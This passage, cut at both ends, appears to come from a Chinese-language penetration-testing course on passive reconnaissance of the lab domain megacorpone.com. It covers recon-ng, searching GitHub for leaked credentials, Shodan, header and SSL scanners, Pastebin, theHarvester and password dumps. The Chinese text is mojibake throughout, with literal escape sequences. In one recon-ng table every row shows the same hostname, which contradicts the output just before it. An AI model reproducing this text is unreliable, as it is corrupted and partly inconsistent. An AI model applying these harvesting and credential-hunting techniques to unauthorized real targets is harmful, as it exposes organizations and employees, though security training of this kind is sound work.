åœ°å€çš„è®°å½•æŸ¥æ‰¾ä¸»æœºä¿¡æ¯ã€‚\n\nå¦‚æ¸…å•ä¸­æ‰€ç¤ºï¼Œæˆ‘ä»¬æœ‰å››ä¸ªæ²¡æœ‰ IP åœ°å€çš„ä¸»æœºã€‚å¦‚æœæˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªâ€œé»˜è®¤â€æ¥æºï¼Œè¯¥æ¨¡å—å°†è‡ªåŠ¨é’ˆå¯¹æˆ‘ä»¬æ•°æ®åº“ä¸­çš„æ‰€æœ‰å››ä¸ªä¸»æœºè¿è¡Œã€‚\n\nè®©æˆ‘ä»¬è¯•è¯•è¿™ä¸ªæ–¹æ³•ï¼Œå°†æˆ‘ä»¬çš„æºè®¾ç½®ä¸ºâ€œé»˜è®¤â€ï¼Œç„¶åè¿è¡Œè¯¥æ¨¡å—ï¼š\n\n```bash\n[recon-ng][default][resolve] > run\n[*] www.megacorpone.com => 38.100.193.76\n[*] vpn.megacorpone.com => 38.100.193.77\n[*] www2.megacorpone.com => 38.100.193.79\n[*] siem.megacorpone.com => 38.100.193.89\n```\n\nä¸é”™ã€‚æˆ‘ä»¬ç°åœ¨æœ‰äº†è¿™å››ä¸ªåŸŸåçš„ IP åœ°å€ã€‚\n\nå¦‚æœæˆ‘ä»¬å†æ¬¡æ˜¾ç¤ºä¸»æœºï¼Œæˆ‘ä»¬å¯ä»¥éªŒè¯æ•°æ®åº“å·²ç»ç”¨ä¸¤ä¸ªæ¨¡å—çš„ç»“æœè¿›è¡Œäº†æ›´æ–°ã€‚\n\n```bash\n[recon-ng][default][resolve] > show hosts\n\n  +-----------------------------------------------------------------------------------------------------------------+\n  | rowid |         host        |   ip_address  | region | country | latitude | longitude | notes |      module     |\n  +-----------------------------------------------------------------------------------------------------------------+\n  | 1     | www.megacorpone.com | 38.100.193.76 |        |         |          |           |       | google_site_web |\n  | 2     | www.megacorpone.com | 38.100.193.77 |        |         |          |           |       | google_site_web |\n  | 3     | www.megacorpone.com | 38.100.193.79 |        |         |          |           |       | google_site_web |\n  | 4     | www.megacorpone.com | 38.100.193.89 |        |         |          |           |       | google_site_web |\n  +-----------------------------------------------------------------------------------------------------------------+\n\n[*] 4 rows returned\n```\n\n### ç»ƒä¹ \n\n1. ä½¿ç”¨ recon/domains-hosts/google_site_web å’Œ recon/hosts-hosts/resolve æ¨¡å—æ¥æ”¶é›† MegaCorp One çš„ä¿¡æ¯ã€‚\n2. èŠ±ç‚¹æ—¶é—´æ¢ç´¢å…¶ä»–ä¾¦æŸ¥æ¨¡å—\n\n## å¼€æºä»£ç \n\nåœ¨ä¸‹é¢çš„ç« èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è®¨è®ºå„ç§åœ¨çº¿å·¥å…·å’Œèµ„æºï¼Œå®ƒä»¬å¯ä»¥ç”¨æ¥è¢«åŠ¨åœ°æœç´¢ä¿¡æ¯ã€‚å…¶ä¸­ä¸€ä¸ªæœ‰è¶£çš„ä¿¡æ¯æ¥æºæ˜¯å¼€æºé¡¹ç›®å’Œåœ¨çº¿ä»£ç åº“ï¼Œå¦‚ GitHubã€GitLab å’Œ SourceForgeã€‚\n\nåœ¨çº¿å­˜å‚¨çš„ä»£ç å¯ä»¥æä¾›ä¸€ä¸ªç»„ç»‡æ‰€ä½¿ç”¨çš„ç¼–ç¨‹è¯­è¨€å’Œæ¡†æ¶çš„ä¸€ç¥ã€‚åœ¨ä¸€äº›ç½•è§çš„æƒ…å†µä¸‹ï¼Œå¼€å‘äººå‘˜ç”šè‡³ä»¥å¤–åœ°å°†å¹³å®‰æ•°æ®å’Œå‡­è¯æäº¤åˆ°å…¬å…±ä»“åº“ã€‚\n\nå…¶ä¸­ä¸€äº›å¹³å°çš„æœç´¢å·¥å…·å°†æ”¯æŒæˆ‘ä»¬åœ¨æœ¬æ¨¡å—å‰é¢è®¨è®ºçš„è°·æ­Œæœç´¢æ“ä½œç¬¦ã€‚\n\nä¾‹å¦‚ï¼ŒGitHub çš„æœç´¢æ˜¯éå¸¸çµæ´»çš„ã€‚åœ¨ GitHub ä¸Šï¼Œæˆ‘ä»¬å¯ä»¥æœç´¢ç”¨æˆ·æˆ–ç»„ç»‡çš„ä»“åº“ï¼Œä½†å¦‚æœæˆ‘ä»¬æƒ³æœç´¢æ‰€æœ‰å…¬å…±ä»“åº“ï¼Œå°±éœ€è¦ä¸€ä¸ªè´¦æˆ·ã€‚åœ¨ä¹‹å‰çš„æ¨¡å—ä¸­ï¼Œæˆ‘ä»¬ç¡®å®šäº† MegaCorp One çš„ GitHub è´¦å·ã€‚\n\nè®©æˆ‘ä»¬åœ¨è¯¥è´¦æˆ·çš„ä»“åº“ä¸­æœç´¢æœ‰è¶£çš„ä¿¡æ¯ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ filename:users æ¥æœç´¢åç§°ä¸­å«æœ‰ â€œusersâ€ çš„ä»»ä½•æ–‡ä»¶ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ed59a055-9ec7-4ea0-8748-879f0137a615/Untitled.png)\n\næˆ‘ä»¬çš„æœç´¢å€¼å‘ç°ä¸€ä¸ªæ–‡ä»¶ â€”â€” xampp.usersã€‚å³ä½¿åªæœ‰ä¸€ä¸ªç»“æœï¼Œæˆ‘ä»¬ä¹Ÿå¯èƒ½å‘ç°äº†éå¸¸æœ‰è¶£çš„ä¸œè¥¿ï¼Œå› ä¸º XAMPP æ˜¯ä¸€ä¸ªç½‘ç»œåº”ç”¨ç¨‹åºå¼€å‘ç¯å¢ƒã€‚è®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0701c9d9-9086-4d31-971e-cfd65489a990/Untitled.png)\n\nè¿™ä¸ªæ–‡ä»¶ä¼¼ä¹åŒ…å«äº†ä¸€ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œåœ¨æˆ‘ä»¬å¼€å§‹ä¸»åŠ¨æ”»å‡»é˜¶æ®µæ—¶å¯èƒ½éå¸¸æœ‰ç”¨ã€‚è®©æˆ‘ä»¬æŠŠå®ƒæ·»åŠ åˆ°æˆ‘ä»¬çš„ç¬”è®°ä¸­ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dbaded95-8349-4849-8371-4c9a7199ec3e/Untitled.png)\n\nè¿™ç§æ‰‹å·¥æ–¹æ³•åœ¨å°å‹ä»“åº“ä¸­æ•ˆæœæœ€å¥½ã€‚å¯¹äºè¾ƒå¤§çš„ä»“åº“ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›å·¥å…·æ¥å¸®åŠ©è‡ªåŠ¨æœç´¢ï¼Œæ¯”å¦‚ Gitrob å’Œ Gitleaks.Recon-ng ä¹Ÿæœ‰ä¸€äº›æ¨¡å—ç”¨äºæœç´¢ GitHubã€‚è¿™äº›å·¥å…·å¤§å¤šéœ€è¦ä¸€ä¸ªè®¿é—®ä»¤ç‰Œæ¥ä½¿ç”¨æºä»£ç æ‰˜ç®¡å•†çš„ APIã€‚\n\nä¾‹å¦‚ï¼Œä¸‹é¢çš„æˆªå›¾æ˜¾ç¤ºäº† Gitleaks åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­æ‰¾åˆ° AWS å®¢æˆ· ID çš„ä¾‹å­ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/41394529-1b80-42e7-80df-fac846e65fa0/Untitled.png)\n\n<aside> ğŸ’¡ é€šè¿‡æºä»£ç æœç´¢ç§˜å¯†çš„å·¥å…·ï¼Œå¦‚ Gitrob æˆ– Gitleaksï¼Œé€šå¸¸ä¾é æ­£åˆ™è¡¨è¾¾å¼æˆ–åŸºäºç†µçš„æ£€æµ‹æ¥è¯†åˆ«æ½œåœ¨çš„æœ‰ç”¨ä¿¡æ¯ã€‚æ­£åˆ™è¡¨è¾¾å¼æ˜¯ä¸€ç§é¢„å®šä¹‰çš„æœç´¢æ¨¡å¼ï¼Œã€‚å®ƒä»¬å¯¹äºåœ¨æ–‡æœ¬ä¸­æœç´¢å¸¸ç”¨å¯†ç çš„å˜åŒ–ç‰¹åˆ«æœ‰ç”¨ã€‚å¦ä¸€æ–¹é¢ï¼ŒåŸºäºç†µçš„æ£€æµ‹è¯•å›¾å¯»æ‰¾éšæœºç”Ÿæˆçš„å­—ç¬¦ä¸²ã€‚è¿™é‡Œçš„æƒ³æ³•æ˜¯ï¼Œä¸€é•¿ä¸²çš„éšæœºå­—ç¬¦å’Œæ•°å­—å¾ˆå¯èƒ½æ˜¯ä¸€ä¸ªå¯†ç ã€‚æ— è®ºä¸€ä¸ªå·¥å…·å¦‚ä½•æœç´¢ç§˜å¯†ï¼Œæ²¡æœ‰ä¸€ä¸ªå·¥å…·æ˜¯å®Œç¾çš„ï¼Œå®ƒä»¬ä¼šé”™è¿‡äººå·¥æ£€æŸ¥å¯èƒ½å‘ç°çš„ä¸œè¥¿ã€‚\n\n</aside>\n\n### ç»ƒä¹ \n\n1. æœç´¢ [Megacopone.com](http://Megacopone.com) çš„ GitHub ä»“åº“ï¼Œå¯»æ‰¾æœ‰è¶£æˆ–æ•æ„Ÿçš„ä¿¡æ¯ã€‚\n\n## Shodan\n\nåœ¨æˆ‘ä»¬æ”¶é›†ç›®æ ‡ä¿¡æ¯çš„è¿‡ç¨‹ä¸­ï¼Œé‡è¦çš„æ˜¯è¦è®°ä½ï¼Œä¼ ç»Ÿçš„ç½‘ç«™åªæ˜¯äº’è”ç½‘çš„ä¸€ä¸ªéƒ¨åˆ†ã€‚\n\nShodan æ˜¯ä¸€ä¸ªæœç´¢å¼•æ“ï¼Œå®ƒæŠ“å–è¿æ¥åˆ°äº’è”ç½‘çš„è®¾å¤‡ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºä¸‡ç»´ç½‘ã€‚è¿™åŒ…æ‹¬è¿è¡Œç½‘ç«™çš„æœåŠ¡å™¨ï¼Œä¹ŸåŒ…æ‹¬è·¯ç”±å™¨å’Œç‰©è”ç½‘è®¾å¤‡ç­‰è®¾å¤‡ã€‚\n\næ¢å¥è¯è¯´ï¼Œè°·æ­Œå’Œå…¶ä»–æœç´¢å¼•æ“å¯»æ‰¾ç½‘ç»œæœåŠ¡å•†çš„å†…å®¹ï¼Œè€Œ Shodan åˆ™æœç´¢è¿æ¥äº’è”ç½‘çš„è®¾å¤‡ï¼Œä¸å®ƒä»¬äº’åŠ¨ï¼Œå¹¶æ˜¾ç¤ºå®ƒä»¬çš„ä¿¡æ¯ã€‚\n\nå°½ç®¡å®Œæˆæœ¬æ¨¡å—æˆ–å®éªŒä¸­çš„ä»»ä½•ææ–™éƒ½ä¸éœ€è¦ä½¿ç”¨ Shodanï¼Œä½†å®ƒå€¼å¾—æˆ‘ä»¬å»æ¢ç´¢ä¸€ä¸‹ã€‚åœ¨ä½¿ç”¨ Shodan ä¹‹å‰ï¼Œæˆ‘ä»¬å¿…é¡»æ³¨å†Œä¸€ä¸ªå…è´¹è´¦å·ï¼Œå®ƒæä¾›æœ‰é™çš„è®¿é—®æƒé™ã€‚\n\nè®©æˆ‘ä»¬å…ˆç”¨ Shodan æ¥æœç´¢ hostname:megacorpone.comã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/963d235a-cdf8-4700-9571-5f6ab2c9667f/Untitled.png)\n\nåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒShodan åˆ—å‡ºäº† IPã€æœåŠ¡å’Œ banner ä¿¡æ¯ã€‚æ‰€æœ‰è¿™äº›éƒ½æ˜¯åœ¨ä¸ä¸å®¢æˆ·çš„ç½‘ç«™äº’åŠ¨çš„æƒ…å†µä¸‹è¢«åŠ¨æ”¶é›†çš„ã€‚\n\nè¿™äº›ä¿¡æ¯ç»™äº†æˆ‘ä»¬ä¸€ä¸ªç›®æ ‡äº’è”ç½‘è¶³è¿¹çš„å¿«ç…§ã€‚ä¾‹å¦‚ï¼Œæœ‰ 8 å°æœåŠ¡å™¨åœ¨è¿è¡Œ SSHï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç‚¹å‡»é¡¶çº§æœåŠ¡ä¸‹çš„ SSH æ¥æ·±å…¥äº†è§£ï¼Œä»¥å®Œå–„æˆ‘ä»¬çš„ç»“æœã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7445302a-f974-47d0-ac43-ca5a3f68479e/Untitled.png)\n\næ ¹æ® Shodan çš„ç»“æœï¼Œæˆ‘ä»¬ç¡®åˆ‡åœ°çŸ¥é“æ¯å°æœåŠ¡å™¨ä¸Šè¿è¡Œçš„æ˜¯å“ªä¸ªç‰ˆæœ¬çš„ OpenSSHã€‚å¦‚æœæˆ‘ä»¬ç‚¹å‡»ä¸€ä¸ª IP åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥æ£€ç´¢åˆ°è¯¥ä¸»æœºçš„æ‘˜è¦ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d86a8aac-398f-402d-b3ac-e5d30710bff2/Untitled.png)\n\næˆ‘ä»¬å¯ä»¥åœ¨è¿™ä¸ªé¡µé¢ä¸ŠæŸ¥çœ‹æœåŠ¡å™¨ä½¿ç”¨çš„åŸŸåã€æœåŠ¡å’ŒæŠ€æœ¯ã€‚Shodan è¿˜å°†æ˜¾ç¤ºä»»ä½•å·²ç¡®å®šçš„æœåŠ¡æˆ–æŠ€æœ¯æ˜¯å¦æœ‰ä»»ä½•å…¬å¼€çš„æ¼æ´ã€‚å½“æˆ‘ä»¬å†³å®šä»å“ªé‡Œå¼€å§‹ä¸»åŠ¨æµ‹è¯•æ—¶ï¼Œè¿™äº›ä¿¡æ¯æ˜¯éå¸¸å®è´µçš„ã€‚\n\n## å®‰å…¨å¤´æ–‡ä»¶æ‰«æå™¨\n\nè¿˜æœ‰ä¸€äº›å…¶ä»–çš„ä¸“ä¸šç½‘ç«™ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨æ¥æ”¶é›†æœ‰å…³ç½‘ç«™æˆ–åŸŸåçš„å®‰å…¨æ€åŠ¿çš„ä¿¡æ¯ã€‚å…¶ä¸­ä¸€äº›ç½‘ç«™æ¨¡ç³Šäº†è¢«åŠ¨å’Œä¸»åŠ¨æ”¶é›†ä¿¡æ¯çš„ç•Œé™ï¼Œä½†å¯¹äºæˆ‘ä»¬çš„ç›®çš„æ¥è¯´ï¼Œå…³é”®çš„ä¸€ç‚¹æ˜¯ï¼Œç¬¬ä¸‰æ–¹æ­£åœ¨å‘èµ·ä»»ä½•æ‰«ææˆ–æ£€æŸ¥ã€‚\n\nä¸€ä¸ªè¿™æ ·çš„ç½‘ç«™ï¼ŒSecurity Headersï¼Œå°†åˆ†æ HTTP å“åº”å¤´å¹¶æä¾›ç›®æ ‡ç½‘ç«™çš„å®‰å…¨æ€åŠ¿çš„åŸºæœ¬åˆ†æã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæ ¹æ®ç»“æœäº†è§£ä¸€ä¸ªç»„ç»‡çš„ç¼–ç å’Œå®‰å…¨å®è·µã€‚\n\nè®©æˆ‘ä»¬æ‰«æ [www.megacorpone.com](http://www.megacorpone.com)ï¼Œå¹¶æ£€æŸ¥ç»“æœ\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dd0db15a-d07f-41c4-854b-a8f1bd75dde2/Untitled.png)\n\nè¯¥ç½‘ç«™ç¼ºå°‘äº†å‡ ä¸ªé˜²å¾¡æ€§æ ‡å¤´ï¼Œå¦‚ Content-Security-Policy å’Œ X-Frame-Optionsã€‚è¿™äº›ç¼ºå°‘çš„æ ‡å¤´æœ¬èº«ä¸ä¸€å®šæ˜¯æ¼æ´ï¼Œä½†å®ƒä»¬å¯èƒ½è¡¨æ˜ç½‘ç«™å¼€å‘äººå‘˜æˆ–æœåŠ¡å™¨ç®¡ç†äººå‘˜ä¸ç†Ÿæ‚‰æœåŠ¡å™¨åŠ å›ºã€‚\n\n<aside> ğŸ’¡ æœåŠ¡å™¨åŠ å›ºï¼Œæˆ–å®‰å…¨é…ç½®ï¼Œæ˜¯é€šè¿‡é…ç½®ç¡®ä¿æœåŠ¡å™¨å®‰å…¨çš„æ•´ä½“è¿‡ç¨‹ã€‚è¿™åŒ…æ‹¬ç¦ç”¨ä¸éœ€è¦çš„æœåŠ¡ï¼Œåˆ é™¤ä¸ä½¿ç”¨çš„æœåŠ¡æˆ–ç”¨æˆ·è´¦æˆ·ï¼Œè½®æµä½¿ç”¨é»˜è®¤å¯†ç ï¼Œè®¾ç½®é€‚å½“çš„æœåŠ¡å™¨å¤´æ–‡ä»¶ç­‰ç­‰ã€‚æˆ‘ä»¬ä¸éœ€è¦çŸ¥é“é…ç½®æ¯ä¸€ç§ç±»å‹çš„æœåŠ¡å™¨çš„æ‰€æœ‰å†…å¹•ï¼Œä½†åœ¨åˆ†ææœåŠ¡å™¨ä»¥ç¡®å®šå¦‚ä½•æœ€å¥½åœ°æ¥è¿‘ä¸€ä¸ªæ½œåœ¨çš„ç›®æ ‡æ—¶ï¼Œäº†è§£è¿™äº›æ¦‚å¿µå’Œæƒ³è¦å¯»æ‰¾çš„ä¸œè¥¿å¯ä»¥å¸®åŠ©æˆ‘ä»¬ã€‚\n\n</aside>\n\n## SSL æœåŠ¡å™¨æµ‹è¯•\n\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨çš„å¦ä¸€ä¸ªæ‰«æå·¥å…·æ˜¯ Qualys SSL Labs çš„ SSL æœåŠ¡å™¨æµ‹è¯•ã€‚è¿™ä¸ªå·¥å…·å¯ä»¥åˆ†ææœåŠ¡å™¨çš„ SSL/TLS é…ç½®ï¼Œå¹¶å°†å…¶ä¸å½“å‰çš„æœ€ä½³åšæ³•è¿›è¡Œæ¯”è¾ƒã€‚å®ƒè¿˜ä¼šè¯†åˆ«ä¸€äº›ä¸ SSL/TLS ç›¸å…³çš„æ¼æ´ï¼Œå¦‚ Poodle æˆ– Hearbleedã€‚è®©æˆ‘ä»¬æ‰«æ [www.megacorpone.com](http://www.megacorpone.com)ï¼Œå¹¶æ£€æŸ¥ç»“æœã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/31cad48b-1c5f-4574-9c6f-4addcdf3b9de/Untitled.png)\n\nå…¶ç»“æœå¹¶ä¸åƒå®‰å…¨å¤´æ–‡ä»¶æ£€æŸ¥é‚£æ ·ç³Ÿç³•ã€‚ç„¶è€Œï¼Œå¼±çš„ Diffie-Hellman ç§˜é’¥äº¤æ¢ã€RC4 å¯†ç å™¨å’Œç¼ºä¹ Forward Secrecy è¡¨æ˜æˆ‘ä»¬çš„ç›®æ ‡æ²¡æœ‰åº”ç”¨å½“å‰çš„ SSL/TLS åŠ å›ºçš„æœ€ä½³å®è·µã€‚ä¾‹å¦‚ï¼Œç”±äºå­˜åœ¨å¤šä¸ªæ¼æ´ï¼Œç¦ç”¨ RC4 å¯†ç å™¨å·²ç»è¢«æ¨èäº†å¥½å‡ å¹´ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™äº›å‘ç°æ¥æ·±å…¥äº†è§£ç›®æ ‡ç»„ç»‡å†…çš„å®‰å…¨å®è·µï¼Œæˆ–è€…è¯´ç¼ºä¹å®‰å…¨å®è·µã€‚\n\n## Pastebin\n\nPastebin æ˜¯ä¸€ä¸ªå­˜å‚¨å’Œåˆ†äº«æ–‡æœ¬çš„ç½‘ç«™ã€‚è¯¥ç½‘ç«™çš„åŸºæœ¬ä½¿ç”¨ä¸éœ€è¦ä¸€ä¸ªè´¦æˆ·ã€‚è®¸å¤šäººä½¿ç”¨ Pastebinï¼Œå› ä¸ºå®ƒæ— å¤„ä¸åœ¨ï¼Œä½¿ç”¨ç®€å•ã€‚ä½†ç”±äº Pastebin æ˜¯ä¸€ä¸ªå…¬å…±æœåŠ¡ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å®ƒæ¥æœç´¢æ•æ„Ÿä¿¡æ¯ã€‚\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç½‘ç«™è¿›è¡ŒåŸºæœ¬æœç´¢ï¼Œæˆ–ä½¿ç”¨ API è¿›è¡Œæ›´é«˜çº§çš„ä½¿ç”¨ã€‚è®©æˆ‘ä»¬æ¥æœç´¢ [Mgeacorpone.com](http://Mgeacorpone.com)ã€‚\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1958f1d-c37f-4b20-ab24-30d126722be2/Untitled.png)\n\nåªæœ‰åä¸ªç»“æœï¼Œä½†å…¶ä¸­ä¸€äº›çœ‹èµ·æ¥éå¸¸ç†Ÿæ‚‰ã€‚æˆ‘ä»¬åœ¨è¿™é‡Œå¯èƒ½æ‰¾ä¸åˆ°ä»»ä½•å…³äº MegaCorp One çš„æ–°ä¿¡æ¯ï¼Œä½†åœ¨æœªæ¥çš„ä¿¡æ¯æ”¶é›†å·¥ä½œä¸­ï¼Œæˆ‘ä»¬ä¸åº”è¯¥å¿½ç•¥æœç´¢ Pasteinã€‚\n\n## ç”¨æˆ·ä¿¡æ¯æ”¶é›†\n\né™¤äº†æ”¶é›†ç›®æ ‡ç»„ç»‡çš„èµ„æºä¿¡æ¯å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ”¶é›†è¯¥ç»„ç»‡å‘˜å·¥çš„ä¿¡æ¯ã€‚æˆ‘ä»¬æ”¶é›†è¿™äº›ä¿¡æ¯çš„ç›®çš„æ˜¯ä¸ºäº†ç¼–åˆ¶ç”¨æˆ·æˆ–å¯†ç åˆ—è¡¨ï¼Œä¸ºç¤¾ä¼šå·¥ç¨‹å»ºç«‹å€Ÿå£ï¼ŒåŠ å¼ºç½‘ç»œé’“é±¼æ´»åŠ¨æˆ–å®¢æˆ·ç«¯æ”»å‡»ï¼Œæ‰§è¡Œå‡­è¯å¡«å……ç­‰ç­‰ã€‚ç„¶è€Œï¼Œæ¯ä¸ªæ¸—é€æµ‹è¯•çš„å‚ä¸è§„åˆ™éƒ½ä¸åŒã€‚ä¸€äº›æ¸—é€æµ‹è¯•å¯èƒ½ä»…é™äºçº¯ç²¹çš„æŠ€æœ¯æµ‹è¯•ï¼Œæ²¡æœ‰ä»»ä½•ç¤¾ä¼šå·¥ç¨‹æ–¹é¢çš„å†…å®¹ã€‚å…¶ä»–æ´»åŠ¨å¯èƒ½åªæœ‰å¾ˆå°‘æˆ–æ²¡æœ‰é™åˆ¶ã€‚\n\nä¸‹é¢çš„ä¸€äº›æ–¹æ³•å°†ä¸å‰å‡ èŠ‚å·²ç»è®¨è®ºè¿‡çš„æ–¹æ³•é‡å ï¼Œä½†æˆ‘ä»¬å°†æ·±å…¥æ¢è®¨ä¸€äº›ä¸“é—¨é’ˆå¯¹ç”¨æˆ·æšä¸¾çš„å·¥å…·ã€‚\n\nå½“æˆ‘ä»¬å¼€å§‹æ”¶é›†ç”¨æˆ·çš„ä¿¡æ¯æ—¶ï¼Œæˆ‘ä»¬ç¡®å®éœ€è¦è°¨æ…è¡Œäº‹ã€‚æ­£å¦‚æˆ‘ä»¬åœ¨æœ¬æ¨¡å—çš„ä»‹ç»ä¸­æåˆ°çš„å…³äºâ€œå¤§å«â€çš„æ•…äº‹ï¼Œæˆ‘ä»¬çš„ç›®æ ‡æ˜¯æ”¹å–„å®¢æˆ·çš„å®‰å…¨æ€åŠ¿ï¼Œè€Œä¸ä¸€å®šè¦è®©ä»»ä½•ä¸€ä¸ªäººè¢«è§£é›‡ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿä¸æƒ³è¿åä»»ä½•æ³•å¾‹ã€‚ä¸€ä¸ªå…¬å¸åªèƒ½æˆæƒé’ˆå¯¹ä»–ä»¬è‡ªå·±çš„ç³»ç»Ÿè¿›è¡Œæµ‹è¯•ï¼Œå‘˜å·¥çš„ä¸ªäººè®¾å¤‡ã€ç¬¬ä¸‰æ–¹ç”µå­é‚®ä»¶å’Œç¤¾äº¤åª’ä½“è´¦æˆ·é€šå¸¸ä¸å±äºè¿™ä¸ªæˆæƒèŒƒå›´ã€‚\n\n### æ”¶è·ç”µå­é‚®ä»¶\n\nè®©æˆ‘ä»¬ä»ä¸€äº›åŸºæœ¬çš„ç”µå­é‚®ä»¶æ”¶é›†å¼€å§‹æˆ‘ä»¬çš„ç”¨æˆ·ä¿¡æ¯æ”¶é›†ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ Harvesterï¼Œå®ƒä»å¤šä¸ªå…¬å…±æ•°æ®æºæ”¶é›†ç”µå­é‚®ä»¶ã€å§“åã€å­åŸŸã€IP å’Œ URLã€‚\n\nä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥è¿è¡Œ Harvesterï¼Œç”¨ `-d` æ¥æŒ‡å®šç›®æ ‡åŸŸï¼Œç”¨ `-b` æ¥è®¾ç½®æœç´¢çš„æ•°æ®æºã€‚\n\n```bash\nkali@kali:~$ theharvester -d megacorpone.com -b google\n...\n[-] Starting harvesting process for domain: megacorpone.com\n\n[-] Searching in Google:\n Searching 0 results...\n Searching 100 results...\n Searching 200 results...\n Searching 300 results...\n Searching 400 results...\n Searching 500 results...\n\nHarvesting results\nNo IP addresses found\n\n[+] Emails found:\n------------------\njoe@megacorpone.com\nmcarlow@megacorpone.com\nfirst@megacorpone.com\n\n[+] Hosts found in search engines:\n------------------------------------\n\nTotal hosts: 13\n\n[-] Resolving hostnames IPs...\n\nNs1.megacorpone.com:38.100.193.70\nSiem.megacorpone.com:38.100.193.89\nadmin.megacorpone.com:38.100.193.83\nbeta.megacorpone.com:38.100.193.88\nfs1.megacorpone.com:38.100.193.82\nintranet.megacorpone.com:38.100.193.87\nmail.megacorpone.com:38.100.193.84\nmail2.megacorpone.com:38.100.193.73\nns1.megacorpone.com:38.100.193.70\nns2.megacorpone.com:38.100.193.80\nurl.megacorpone.com:empty\nwww.megacorpone.com:38.100.193.76\nwww2.megacorpone.com:38.100.193.79\n```\n\næˆ‘ä»¬å‘ç°äº†ä¸€äº›ç”µå­é‚®ä»¶åœ°å€ï¼Œå…¶ä¸­ä¸€ä¸ª â€œfirst@megacorpone.comâ€ å¯¹æˆ‘ä»¬æ¥è¯´ä¼¼ä¹æ˜¯æ–°çš„ã€‚[æˆ‘ä»¬è¿˜å‘ç°äº†megacorpone.com](http://xn--megacorpone-ix9qn5bh73bnn4ci66c899e.com) çš„ä¸€äº›æ–°å­åŸŸã€‚è®©æˆ‘ä»¬æŠŠè¿™äº›ä¹Ÿæ·»åŠ åˆ°æˆ‘ä»¬çš„ç¬”è®°ä¸­ã€‚\n\nè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æé†’ï¼Œä¿¡æ¯æ”¶é›†å¹¶ä¸æ€»æ˜¯ä¸€ä¸ªæ•´é½çš„ã€çº¿æ€§çš„è¿‡ã€‚æˆ‘ä»¬å¯èƒ½æ­£åœ¨å¯»æ‰¾ç”¨æˆ·çš„ä¿¡æ¯æ—¶ï¼Œå‘ç°äº†å…³äºæˆ‘ä»¬ç›®æ ‡çš„å…¶ä»–ä¿¡æ¯ã€‚è¿™å°±æ˜¯ä¿æŒè‰¯å¥½çš„ç¬”è®°çš„ä¸€ä¸ªåŸå› ã€‚\n\n### å¯†ç è½¬å‚¨\n\næ¶æ„é»‘å®¢ç»å¸¸åœ¨ Pastebin æˆ–å…¶ä»–ä¿¡èª‰è¾ƒå·®çš„ç½‘ç«™ä¸Šè½¬å‚¨è¢«ç ´è§£çš„å‡­è¯ã€‚è¿™äº›å¯†ç è½¬å‚¨å¯¹äºç”Ÿæˆè¯è¡¨æ¥è¯´æ˜¯éå¸¸æœ‰ä»·å€¼çš„ã€‚ä¾‹å¦‚ï¼ŒKali Linux åŒ…æ‹¬ä» 2009 å¹´çš„æ•°æ®æ³„éœ²äº‹ä»¶ä¸­äº§ç”Ÿçš„ â€œrockyouâ€ å­—æ ·ã€‚\n\n## ç¤¾ä¼šåª’ä½“å·¥å…·\n\nå‡ ä¹æ‰€æœ‰çš„ç»„ç»‡ç°åœ¨éƒ½åœ¨ç¤¾ä¼šåª’ä½“ä¸Šä¿æŒç€æŸç§å­˜åœ¨ã€‚åœ¨å…¬å¸å‘å¸ƒçš„ä¿¡æ¯å¯¹æˆ‘ä»¬æ¥è¯´éå¸¸æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™äº›ä¿¡æ¯æ¥è¯†åˆ«æ½œåœ¨çš„å‘˜å·¥ï¼Œå¹¶è·å¾—æ›´å¤šå…³äºå…¬å¸åŠå…¶è¿ä½œçš„ä¿¡æ¯ã€‚æœ‰å„ç§æ–¹æ³•å¯ä»¥é€šè¿‡æˆ‘ä»¬å·²ç»è®¨è®ºè¿‡çš„å‡ ä¸ªå·¥å…·æ¥æ”¶é›†è¿™äº›å…¬å…±ä¿¡æ¯ï¼Œä¾‹å¦‚ recon-ng å’Œ theHarvesterã€‚è®©æˆ‘ä»¬æ¥æ¢è®¨ä¸€ä¸‹å¦å¤–å‡ ä¸ªå·¥å…·ã€‚\n\n### Social-Searcher\n\nSocial-Searcher 